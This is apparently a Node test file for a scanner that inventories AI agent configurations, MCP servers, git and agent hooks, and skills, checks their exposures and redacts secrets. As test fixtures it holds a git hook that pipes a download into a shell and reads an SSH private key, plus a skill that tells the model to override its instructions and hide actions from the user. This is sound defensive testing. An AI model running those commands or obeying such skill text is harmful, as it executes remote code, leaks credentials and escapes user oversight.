import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { run } from '../src/engine.js';
import { detectors } from '../src/detectors/index.js';
import { classifyValue, scanEnvObject, redact } from '../src/redact.js';

const fixtures = path.join(path.dirname(fileURLToPath(import.meta.url)), 'fixtures');

function withHome(home, platform = 'win32') {
  process.env.GEIGER_HOME = path.join(fixtures, home);
  process.env.GEIGER_PLATFORM = platform;
}

test('empty home yields zero findings and zero diagnostics', async () => {
  withHome('empty');
  const r = await run(detectors, {});
  assert.equal(r.findings.length, 0);
  assert.equal(r.diagnostics.length, 0);
});

test('fixture home: agents, wrapped server, secrets, plugin inventory', async () => {
  withHome('home1');
  const r = await run(detectors, {});
  const names = r.findings.map((f) => f.name);

  const wrapped = r.findings.find((f) => f.name.startsWith('wrapped-server'));
  assert.ok(wrapped, 'wrapped server detected');
  assert.equal(wrapped.origin.type, 'registry');
  assert.equal(wrapped.origin.ref, '@example/mcp-thing');
  assert.ok(wrapped.notes.some((n) => n.includes('policy agent')), 'wrapper surfaced');
  assert.ok(wrapped.exposures.includes('HOLDS-SECRETS'));
  assert.equal(wrapped.secrets[0].key, 'API_KEY');
  assert.equal(wrapped.secrets[0].shape, 'Anthropic API key');

  const local = r.findings.find((f) => f.name.startsWith('local-script'));
  assert.ok(local.exposures.includes('UNKNOWN-ORIGIN'), 'local script flagged unknown-origin');

  const remote = r.findings.find((f) => f.name.startsWith('remote'));
  assert.equal(remote.origin.type, 'remote');

  assert.ok(names.some((n) => n.includes('hooks:')), 'hooks reported');
  assert.ok(names.includes('test-plugin'), 'plugin inventory parsed');

  const codex = r.findings.find((f) => f.name === 'Codex CLI');
  assert.ok(codex, 'codex detected');
  assert.ok(codex.exposures.includes('HOLDS-SECRETS'), 'secret shape found in toml text');

  // v0.2.1 coverage: Kilo, Grok Build, Firefox, JetBrains
  assert.ok(names.includes('Kilo CLI'), 'kilo cli detected');
  const kiloSrv = r.findings.find((f) => f.name.startsWith('kilo-tool'));
  assert.ok(kiloSrv, 'kilo mcp server parsed from kilo.jsonc (JSONC comments tolerated)');
  assert.equal(kiloSrv.origin.ref, '@example/kilo-tool@latest');
  assert.ok(names.includes('Grok Build'), 'grok build detected');
  const ff = r.findings.find((f) => f.name.startsWith('ChatGPT Sidebar'));
  assert.ok(ff, 'firefox AI extension detected');
  assert.ok(ff.exposures.includes('BROAD-WEB') && ff.exposures.includes('EXECUTES'), 'firefox permissions mapped (broad origins + nativeMessaging)');
  assert.ok(!r.findings.some((f) => f.name.startsWith('uBlock')), 'non-AI firefox extension ignored');
  const jb = r.findings.find((f) => f.detector === 'jetbrains');
  assert.ok(jb, 'jetbrains AI/MCP settings detected');
  assert.ok(jb.exposures.includes('EXECUTES'), 'mcp settings file implies configured servers can execute');

  // v0.3.0 coverage: host apps/IDEs by presence, AI browsers, hooks beyond Claude Code
  for (const n of ['Cursor', 'Windsurf', 'Claude Desktop', 'ChatGPT Desktop']) {
    assert.ok(names.includes(n), n + ' reported by presence, even with no MCP servers of its own');
  }
  assert.ok(r.findings.find((f) => f.name === 'Cursor').exposures.includes('EXECUTES'), 'agentic IDE labeled EXECUTES');
  assert.equal(r.findings.find((f) => f.name === 'Claude Desktop').kind, 'app');
  assert.ok(r.findings.some((f) => f.name.startsWith('ws-tool')), 'windsurf mcp server parsed alongside the host finding');
  assert.ok(r.findings.some((f) => f.name.startsWith('desk-remote') && f.origin.type === 'remote'), 'claude desktop remote server parsed');

  const comet = r.findings.find((f) => f.kind === 'browser' && f.name === 'Comet');
  assert.ok(comet, 'AI browser reported by profile presence');
  assert.ok(comet.exposures.includes('BROAD-WEB') && comet.confidence === 'medium', 'AI browser labeled honestly (inherent, medium confidence)');
  const cometExt = r.findings.find((f) => f.name.startsWith('Claude Helper (Comet'));
  assert.ok(cometExt && cometExt.exposures.includes('BROAD-WEB'), 'extension walk covers AI-browser profiles');

  const cursorHooks = r.findings.find((f) => f.name.startsWith('Cursor hooks:'));
  assert.ok(cursorHooks, 'cursor hooks.json read');
  assert.ok(cursorHooks.name.includes('beforeShellExecution') && cursorHooks.name.includes('afterFileEdit'), 'cursor hook events listed');
  assert.ok(cursorHooks.exposures.includes('EXECUTES'));
  assert.equal(cursorHooks.notes.filter((n) => n.startsWith('command: ')).length, 2, 'object and bare-string hook entries both read');
  const codexHook = r.findings.find((f) => f.name === 'Codex hooks: notify');
  assert.ok(codexHook, 'codex notify read from config.toml root table');
  assert.ok(codexHook.notes.some((n) => n === 'command: python3 /home/alex/.codex/notify.py'), 'multi-line notify array joined to one command');
  assert.ok(!codexHook.notes.some((n) => n.includes('ignored-in-section')), 'notify inside a table is not a hook');
  const gemHooks = r.findings.find((f) => f.name.startsWith('Gemini CLI hooks:'));
  assert.ok(gemHooks && gemHooks.name.includes('BeforeTool'), 'gemini cli hooks read (claude-style nested groups unwrapped)');
  assert.ok(gemHooks.notes.some((n) => n.endsWith('guard.sh')), 'nested hook command surfaced');
});

test('codex notify reader: root table only, continuation lines, escapes, bare string', async () => {
  const { parseCodexNotify } = await import('../src/detectors/hooks.js');
  assert.deepEqual(parseCodexNotify('model = "x"\nnotify = ["a", "b c"]\n'), ['a b c']);
  assert.deepEqual(parseCodexNotify('notify = "single-cmd --flag"'), ['single-cmd --flag']);
  assert.deepEqual(parseCodexNotify('notify = [\n  "one",\n  "two", # trailing comment\n]\n'), ['one two']);
  assert.deepEqual(parseCodexNotify('[profiles.x]\nnotify = ["nope"]\n'), [], 'section-scoped key ignored');
  assert.deepEqual(parseCodexNotify('\uFEFFnotify = ["bom-ok"]'), ['bom-ok'], 'BOM tolerated');
  assert.deepEqual(parseCodexNotify('notify = ["C:\\\\tools\\\\hook.exe", "x"]'), ['C:\\tools\\hook.exe x'], 'TOML basic-string backslash escapes unescaped once');
  assert.deepEqual(parseCodexNotify(null), []);
  assert.deepEqual(parseCodexNotify('notify = [\n"unterminated"'), ['unterminated'], 'unbalanced array still yields what it can, never throws');
});

test('REDACTION GUARANTEE: no secret value ever appears in serialized output', async () => {
  withHome('home1');
  const r = await run(detectors, {});
  const blob = redact(JSON.stringify(r));
  assert.ok(!blob.includes('fixture00000000000000000000'), 'anthropic-shaped value leaked');
  assert.ok(!blob.includes('fixturefixturefixturefixture00'), 'openai-shaped value leaked');
});

test('secret shape classification', () => {
  assert.equal(classifyValue('sk-ant-abc12345678901234567890'), 'Anthropic API key');
  assert.equal(classifyValue('ghp_ABCDEFGHIJKLMNOPQRSTUV12'), 'GitHub token');
  assert.equal(classifyValue('hello world'), null);
  const hits = scanEnvObject({ MY_TOKEN: 'longopaquevalue123', NORMAL: 'yes' });
  assert.equal(hits.length, 1);
  assert.equal(hits[0].key, 'MY_TOKEN');
});

test('tolerant parser: lone backslashes in hand-edited Windows configs', async () => {
  const { parseJsonTolerant } = await import('../src/util/fsx.js');
  const raw = '{ "command": "C:\\Users\\me\\tool.exe" }';
  const r = parseJsonTolerant(raw);
  assert.equal(r.error, null);
  // note: escapes that are coincidentally valid JSON (like the \t in
  // \tool.exe) cannot be disambiguated — detection succeeds, exact path
  // fidelity is not promised for those characters.
  assert.ok(r.value.command.startsWith('C:'));
  assert.ok(r.value.command.includes('Users'));
});

test('diff mode: added, removed, escalated — and strict gates on drift only', async () => {
  const { diffResults } = await import('../src/diff.js');
  withHome('home1');
  const current = await run(detectors, {});

  // identical baseline → no drift
  const same = JSON.parse(JSON.stringify(current));
  const clean = diffResults(same, current);
  assert.equal(clean.added.length, 0);
  assert.equal(clean.removed.length, 0);
  assert.equal(clean.changed.length, 0);
  assert.equal(clean.newHot, 0);

  // mutate a baseline: drop one hot finding (→ shows as appeared),
  // invent one (→ shows as removed), strip an exposure (→ shows as changed)
  const base = JSON.parse(JSON.stringify(current));
  const dropped = base.findings.findIndex((f) => f.exposures.includes('EXECUTES'));
  const droppedName = base.findings[dropped].name;
  base.findings.splice(dropped, 1);
  base.findings.push({ detector: 'x', kind: 'agent', name: 'GhostAgent', origin: { type: 'registry', ref: 'ghost' }, exposures: [], secrets: [] });
  const weakened = base.findings.find((f) => f.exposures.includes('HOLDS-SECRETS'));
  if (weakened) weakened.exposures = weakened.exposures.filter((x) => x !== 'HOLDS-SECRETS');

  const d = diffResults(base, current);
  assert.ok(d.added.some((f) => f.name === droppedName), 'dropped finding reappears as added');
  assert.ok(d.removed.some((f) => f.name === 'GhostAgent'), 'invented finding shows as removed');
  if (weakened) assert.ok(d.changed.some((c) => c.deltas.includes('gained HOLDS-SECRETS')), 'escalation detected');
  assert.ok(d.newHot >= 1, 'new hot findings counted for strict drift gating');
});

test('remediation actions exist for hot findings', async () => {
  const { actionsFor } = await import('../src/engine.js');
  process.env.GEIGER_HOME = path.join(fixtures, 'home1');
  process.env.GEIGER_PLATFORM = 'win32';
  const r = await run(detectors, {});
  const wrapped = r.findings.find((f) => f.name.startsWith('wrapped-server'));
  const acts = actionsFor(wrapped);
  assert.ok(acts.length >= 2, 'mcp server with secret gets multiple actions');
  assert.ok(acts.some((a) => a.includes('Rotate')), 'secret rotation advised');
});

// ── Byte-order marks and unparseable configs (reported privately, v0.3.1) ──
// BOM fixtures are built at test time from an escape sequence so no editor or
// git setting can silently strip the three bytes from a checked-in file.
const BOM = '\uFEFF';
const MCP = JSON.stringify({ mcpServers: { 'local-tools': { command: 'node', args: ['server.js'], env: { MCP_TOKEN: 'sk-FAKE-FIXTURE-0001' } } } });
const CLAUDE_HOOKS = JSON.stringify({ hooks: { PreToolUse: [{ matcher: 'Bash', hooks: [{ type: 'command', command: 'node hook.js' }] }] } });
const CURSOR_HOOKS = JSON.stringify({ version: 1, hooks: { beforeShellExecution: [{ command: 'node y.js' }] } });

function tmpHome(files) {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'geiger-test-'));
  for (const [rel, content] of Object.entries(files)) {
    const p = path.join(root, rel);
    fs.mkdirSync(path.dirname(p), { recursive: true });
    fs.writeFileSync(p, content, 'utf8');
  }
  process.env.GEIGER_HOME = root;
  process.env.GEIGER_PLATFORM = 'win32';
  return root;
}

test('BOM-prefixed configs are parsed, not dropped: MCP servers, hooks, and the drift alarm', async () => {
  const { diffResults } = await import('../src/diff.js');
  const home = tmpHome({
    '.claude.json': BOM + MCP,
    '.claude/settings.json': BOM + CLAUDE_HOOKS,
    '.cursor/hooks.json': BOM + CURSOR_HOOKS,
    'proj/.cursor/mcp.json': BOM + MCP,
  });
  const ctx = { paths: [path.join(home, 'proj')] };
  try {
    const r = await run(detectors, ctx);
    assert.ok(!r.findings.some((f) => f.name.startsWith('unparseable')), 'no BOM file is reported as unparseable');
    for (const label of ['Claude Code · global', 'Cursor · project']) {
      const f = r.findings.find((x) => x.name.startsWith('local-tools (' + label));
      assert.ok(f, 'server from BOM file reported: ' + label);
      assert.ok(f.exposures.includes('EXECUTES') && f.exposures.includes('HOLDS-SECRETS'), 'exposures computed: ' + label);
    }
    assert.ok(r.findings.some((f) => f.name === 'hooks: PreToolUse'), 'claude code hooks read from BOM settings');
    assert.ok(r.findings.some((f) => f.name === 'Cursor hooks: beforeShellExecution'), 'cursor hooks read from BOM hooks.json');

    // The drift alarm must see a hook that arrives in a BOM'd file.
    fs.writeFileSync(path.join(home, '.claude', 'settings.json'), '{}');
    const base = JSON.parse(JSON.stringify(await run(detectors, ctx)));
    fs.writeFileSync(path.join(home, '.claude', 'settings.json'), BOM + CLAUDE_HOOKS);
    const d = diffResults(base, await run(detectors, ctx));
    assert.ok(d.added.some((f) => f.name === 'hooks: PreToolUse'), 'BOM hook shows as appeared');
    assert.ok(d.newHot >= 1, 'strict drift gate trips on the BOM hook');
  } finally {
    fs.rmSync(home, { recursive: true, force: true });
  }
});

test('unparseable configs stay visible, are shape-scanned, and never echo file content', async () => {
  const home = tmpHome({
    // unquoted value: V8's "Unexpected token" message would quote it
    'proj/.cursor/mcp.json': '{"mcpServers":{"t":{"command":"node","env":{"MCP_TOKEN": opaquesecretvalue123, "K":"sk-ant-fixture00000000000000"}}}}',
    '.claude/settings.json': '{"hooks": {"PreToolUse": [ oops ]}}',
    '.cursor/hooks.json': '{"hooks": { broken',
  });
  try {
    const r = await run(detectors, { paths: [path.join(home, 'proj')] });
    const mcp = r.findings.find((f) => f.name.startsWith('unparseable config (Cursor · project'));
    assert.ok(mcp, 'unparseable MCP config reported');
    assert.ok(mcp.exposures.includes('HOLDS-SECRETS'), 'unparseable config shape-scanned for credentials');
    assert.ok(mcp.notes.some((n) => n.includes('appears to declare MCP servers')), 'declared servers called out');
    assert.ok(r.findings.some((f) => f.name.startsWith('unparseable config (Claude Code settings')), 'unparseable claude settings no longer silent');
    assert.ok(r.findings.some((f) => f.name.startsWith('unparseable config (Cursor · ')), 'unparseable cursor hooks no longer silent');
    // Deliberately NOT passed through redact(): the report must be clean on its own.
    const raw = JSON.stringify(r);
    assert.ok(!raw.includes('opaquesecr'), 'parse error text never carries config content');
    assert.ok(!raw.includes('sk-ant-fixture'), 'shape-scanned credential value absent');
  } finally {
    fs.rmSync(home, { recursive: true, force: true });
  }
});

// ── Git hooks and skill text (v0.4.0) ──────────────────────────────────────
// The git fixture is built at test time: git refuses to track any path with a
// `.git` component, so it cannot be a checked-in fixture.
test('git hooks: live hooks, samples ignored, merge driver, hostile shapes, hooksPath', async () => {
  const home = tmpHome({
    'repo/.git/config': '[core]\n\trepositoryformatversion = 0\n[merge "graphify"]\n\tname = union merge\n\tdriver = python -m graphify merge-driver %O %A %B\n',
    'repo/.git/hooks/post-commit': '#!/bin/sh\n# Installed by: graphify hook install\n(\nexport PYTHONHASHSEED=0\ngraphify extract . --code-only\n)\n',
    'repo/.git/hooks/pre-push': '#!/bin/sh\ncurl https://203.0.113.9/p.sh | sh\ncat ~/.ssh/id_rsa\n',
    'repo/.git/hooks/pre-commit.sample': '#!/bin/sh\nexit 0\n',
    'elsewhere/.git/config': '[core]\n\thooksPath = ../shared-hooks\n',
    'elsewhere/../shared-hooks/pre-commit': '#!/bin/sh\necho shared\n',
  });
  try {
    const repo = path.join(home, 'repo');
    const r = await run(detectors, { paths: [repo, path.join(home, 'elsewhere')] });

    const gh = r.findings.find((f) => f.detector === 'git-hooks' && f.kind === 'hook' && f.name.includes('repo'));
    assert.ok(gh, 'git hooks reported for the repo');
    assert.ok(gh.exposures.includes('EXECUTES'), 'git hooks execute');
    assert.ok(gh.name.includes('post-commit') && gh.name.includes('pre-push'), 'live hooks listed');
    assert.ok(!gh.name.includes('.sample'), 'git sample hooks are not findings');
    assert.ok(gh.notes.some((n) => n.includes('installed by graphify hook install')), 'installer marker surfaced');
    assert.ok(gh.notes.some((n) => n === 'post-commit: runs graphify'), 'the program a hook invokes is surfaced, not its first guard clause');
    assert.ok(gh.notes.some((n) => n.startsWith('pre-push: runs ') && n.includes('curl')), 'hostile hook programs surfaced');
    assert.ok(gh.notes.some((n) => n.includes('pipes it straight into a shell')), 'download-pipe-shell flagged');
    assert.ok(gh.notes.some((n) => n.includes('reads a credential file')), 'credential-file read flagged');

    const md = r.findings.find((f) => f.name.startsWith('git merge driver "graphify"'));
    assert.ok(md && md.exposures.includes('EXECUTES'), 'merge driver reported as executing');
    assert.ok(md.notes.some((n) => n.startsWith('driver: python -m graphify')), 'driver command surfaced');

    const shared = r.findings.find((f) => f.detector === 'git-hooks' && f.name.includes('elsewhere'));
    assert.ok(shared && shared.notes.some((n) => n.includes('core.hooksPath')), 'hooksPath redirect surfaced');
  } finally {
    fs.rmSync(home, { recursive: true, force: true });
  }
});

test('hook program reader: heredocs, multi-line -c payloads, redirects, comments', async () => {
  const { programsIn } = await import('../src/detectors/git-hooks.js');
  // Real hooks embed code. Its identifiers must not be reported as programs.
  assert.deepEqual(programsIn('#!/bin/sh\n"$PY" -c "import os\n_src = 1\nfrom pathlib import Path\n"\ngit status\n'), ['git']);
  assert.deepEqual(programsIn('#!/bin/sh\npython3 - <<PY\nfrom x import y\nPY\ngit status\n'), ['python3', 'git']);
  assert.deepEqual(programsIn('#!/bin/sh\n"/c/tools/python.exe" -m graphify\n'), ['python'], 'quoted program path still counts');
  assert.deepEqual(programsIn('#!/bin/sh\ngraphify extract . >/dev/null 2>&1\ncurl http://x | sh\n'), ['graphify', 'curl', 'sh'], 'redirects are not programs');
  assert.deepEqual(programsIn('# a comment; with prose that tried to look like a command\n'), [], 'comment prose ignored');
  assert.deepEqual(programsIn(''), []);
});

test('git config reader: sections, subsections, quoted values', async () => {
  const { parseGitConfig } = await import('../src/detectors/git-hooks.js');
  const cfg = parseGitConfig('[core]\n\thooksPath = .husky\n[merge "a"]\n\tdriver = cmd-a %O\n[merge "b"]\n\tdriver = cmd-b\n[user]\n\tname = x\n');
  assert.equal(cfg.hooksPath, '.husky');
  assert.deepEqual(cfg.mergeDrivers.map((d) => d.name), ['a', 'b']);
  assert.equal(cfg.mergeDrivers[0].driver, 'cmd-a %O');
  assert.deepEqual(parseGitConfig('').mergeDrivers, []);
  assert.equal(parseGitConfig('# [core]\n# hooksPath = nope\n').hooksPath, null, 'commented lines ignored');
});

test('skill text is read, not just listed: steering, risky commands, secret shapes', async () => {
  withHome('home1');
  const r = await run(detectors, {});
  const bad = r.findings.find((f) => f.kind === 'skill' && f.name === 'helpful-helper');
  assert.ok(bad, 'skill detected');
  assert.ok(bad.notes.some((n) => n.startsWith('says: ')), 'frontmatter description surfaced');
  assert.ok(bad.notes.some((n) => n.includes('ignore or override its previous instructions')), 'override-instructions flagged');
  assert.ok(bad.notes.some((n) => n.includes('act without telling the user')), 'hide-from-user flagged');
  assert.ok(bad.notes.some((n) => n.includes('pipes it straight into a shell')), 'risky command in skill text flagged');
  assert.ok(bad.exposures.includes('HOLDS-SECRETS'), 'credential shape in skill text');
  assert.equal(bad.secrets[0].shape, 'Anthropic API key');

  const good = r.findings.find((f) => f.kind === 'skill' && f.name === 'tidy-notes');
  assert.ok(good, 'benign skill still reported');
  assert.equal(good.exposures.length, 0, 'benign skill claims nothing');
  assert.equal(good.notes.filter((n) => !n.startsWith('says: ')).length, 0, 'no false-positive flags on the benign twin');

  const blob = JSON.stringify(r);
  assert.ok(!blob.includes('fixtureSKILL'), 'skill secret value never serialized');
});

test('skill frontmatter: folded block scalars, quotes, and missing frontmatter', async () => {
  const { frontmatterField } = await import('../src/skill-scan.js');
  // Real skills write `description: >` with the text folded onto later lines;
  // reading only the first line yields a useless ">".
  assert.equal(frontmatterField('---\nname: x\ndescription: >\n  Ship-and-verify discipline for\n  production systems.\n---\n\nbody', 'description'),
    'Ship-and-verify discipline for production systems.');
  assert.equal(frontmatterField('---\ndescription: "hello there"\n---\n', 'description'), 'hello there');
  assert.equal(frontmatterField('no frontmatter at all', 'description'), null);
  assert.equal(frontmatterField('---\ndescription:\n---\n', 'description'), null);
});

test('tolerant parser: leading BOM, and error labels carry location only', async () => {
  const { parseJsonTolerant } = await import('../src/util/fsx.js');
  assert.deepEqual(parseJsonTolerant(BOM + '{"a":1}').value, { a: 1 });
  assert.deepEqual(parseJsonTolerant(BOM + '{"a":1, // c\n}').value, { a: 1 }, 'BOM does not defeat the comment/trailing-comma pass');
  const bad = parseJsonTolerant('{"k": secretish}');
  assert.match(bad.error, /^unparseable JSON/);
  assert.ok(!bad.error.includes('secretish'), 'no content in the error label');
});
